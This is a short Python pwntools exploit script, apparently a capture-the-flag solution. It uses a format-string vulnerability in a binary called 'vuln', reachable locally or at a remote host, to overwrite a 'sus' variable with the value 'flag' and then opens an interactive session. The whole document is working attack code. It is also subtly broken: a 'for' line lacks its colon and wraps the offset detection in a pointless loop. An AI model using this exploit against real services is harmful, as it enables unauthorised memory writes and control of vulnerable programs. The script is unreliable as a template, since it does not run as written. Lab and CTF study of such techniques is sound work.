from pwn import *

# Binary setup
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# Local or remote
def start():
    if args.REMOTE:
        return remote('target.server.com', 1234)
    else:
        return process(exe)

# Address of 'sus' variable
sus_addr = elf.symbols['sus']
target = 0x67616c66

# Start process
p = start()

# Leak function for FmtStr
def leak(payload):
    p.sendlineafter(b'?\n', payload)
    return p.recvline()

# Auto-detect offset
for i in range(1,21)
    fmt = FmtStr(leak)
    offset = fmt.offset
    log.success(f'Auto-detected offset: {offset}')

# Craft exploit payload
payload = fmtstr_payload(offset, {sus_addr: target}, write_size='short')
log.info(f'Payload: {payload}')

# Send payload
p.sendlineafter(b'?\n', payload)

# Interact for flag
p.interactive()
